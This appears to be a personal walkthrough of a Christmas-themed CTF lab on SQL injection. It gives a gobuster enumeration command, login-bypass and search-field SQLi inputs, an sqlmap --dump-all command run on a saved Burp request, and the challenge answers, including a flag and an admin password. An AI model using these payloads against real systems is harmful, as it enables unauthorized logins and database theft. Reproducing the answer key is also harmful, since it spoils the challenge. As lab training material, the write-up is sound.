#Day-5

--
====================================================================
After last year's attack, Santa and the security team have worked hard on reviving Santa's personal portal. Hence, 'Santa's forum 2' went live.

After the attack, logs have revealed that someone has found Santa's panel on the website and logged into his account! After doing so, they were able to dump the whole gift list database, getting all the 2020 gifts in their hands. An attacker has threatened to publish a wishlist.txt file, containing all information, but happily, for us, he was caught by the CBI (Christmas Bureau of Investigation) before that. On MACHINE_IP:8000 you'll find the copy of the website and your goal is to replicate the attacker's actions by dumping the gift list!
====================================================================

running basic enumaration on target using gobuster:

#gobuster dir -u http://10.10.116.155:8000 -w /usr/share/dirb/wordlists/common.txt | tee -a gobuster

--
====================================================================

#1	Without using directory brute forcing, what's Santa's secret login panel?
	Ans: santapanel

#2	Visit Santa's secret login panel and bypass the login using SQLi
	And: No answer needed.

	we bypasswd the login page by putting the following input
	username: admin' or 1+1 --
	password: admin //dosenst matters whatever you put here.

#3	How many entries are there in the gift database?
	Ans: 22

	we dicoverd that by puting following input in search.

	1' or 1+1 --

#4	What did Paul ask for?
	ans: github ownership

--
====================================================================
#So to dump all the data from database we need to intercpt the tarffic using brupsuit.

	so turn the burpsuit on and let's input anything in search feild and then see the burpsuit result. save it as panel.request

	now let's run the sql map to dump all the content from the database.

	sqlmap -r panel.request --tamper=space2comment --dump-all --dbms sqlite
--
====================================================================

#5	What is the flag?
	Ans: thmfox{All_I_Want_for_Christmas_Is_You}

#6	What is admin's password?
	Ans: EhCNSWzzFP6sc7gB


